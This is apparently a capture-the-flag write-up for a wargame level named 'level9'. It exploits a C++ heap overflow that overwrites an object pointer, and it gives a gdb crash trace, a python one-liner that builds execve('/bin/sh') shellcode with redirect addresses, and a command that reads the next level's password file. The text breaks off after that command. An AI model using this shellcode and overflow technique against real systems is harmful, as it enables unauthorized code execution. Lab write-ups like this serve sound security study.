## Steps

No calls to `/bin/sh` and no direct access to `.pass`, we can assume we will have to use **shellcode** this time.	
`operator new` is called twice. This will allocate memory for an object.		
The program takes a single argument, that is placed into the first object instance with `strlen()` and `memcpy()`.	
A `call` later in the program uses the address stored at the start of the second object instance as parameter.		

*Lets try and see if we can overflow on the heap using the `strcpy()`.*

```bash
gdb level9
r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Program received signal SIGSEGV, Segmentation fault.
0x08048682 in main ()
```

The **segfault** occurs after 108 characters, and occurs because the program interprets the begining of the second object instance as a pointer to executable code.     
To spawn a shell we will have to include pointers that redirect to our shellcode so that the instructions before the `call` do not crash.

```bash
python -c "print '\x08\x04\xa0\x10'[::-1] + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' + 83 * 'A' + '\x08\x04\xa0\x0c'[::-1]" > /tmp/inj9

cat /home/user/bonus0/.pass
